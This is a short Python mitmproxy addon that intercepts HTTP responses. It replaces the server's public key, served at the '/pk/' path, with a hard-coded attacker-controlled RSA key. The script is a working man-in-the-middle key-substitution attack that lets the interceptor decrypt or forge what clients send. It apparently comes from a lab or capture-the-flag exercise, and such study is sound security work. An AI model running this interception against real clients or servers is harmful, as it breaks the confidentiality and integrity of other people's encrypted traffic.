import json
from mitmproxy import http
# from Crypto.PublicKey import RSA
# This line is not needed and causes the error – kept here to remind us!!! 


def response(flow: http.HTTPFlow) -> None:
    """Intercepts responses from the server"""
    # replace the server's public key with our own
    if flow.request.path == '/pk/' and flow.request.method == 'GET':
        flow.response = http.Response.make(
            200,
            '-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv0uEGSFviOka2xFRSuyTbycOLXdvpBJqQI+GJu4nX2mvu0FY70lCdcKhwpARNT0FsO42m4hiToouDWrP2CVCuFd1iwhR550wG2qu5Oov46xuS+hXo8gJ3ockj9VAQHpSePg+/eN3U2iUmmP4PgZajF5fVl35qmXRCIRRu6houckH9WkEIBf0o8bXD2s60kJ0VxVrV8KRkR+uEThbsp1MuLAA+FiwKvZjJ2BDozC90oJcMg434HgyHQTDUl48DzzKFq/EbXTxUhqsrSUdpzp8wJ+Tz9Cm4y8AgK1IjTHMqQjjFAgD4kNpP8SDFLYe35k0sahBR7p12iQNjVSxkE8JtQIDAQAB-----END PUBLIC KEY-----',
            {'content-type': 'text/plain'},
        )
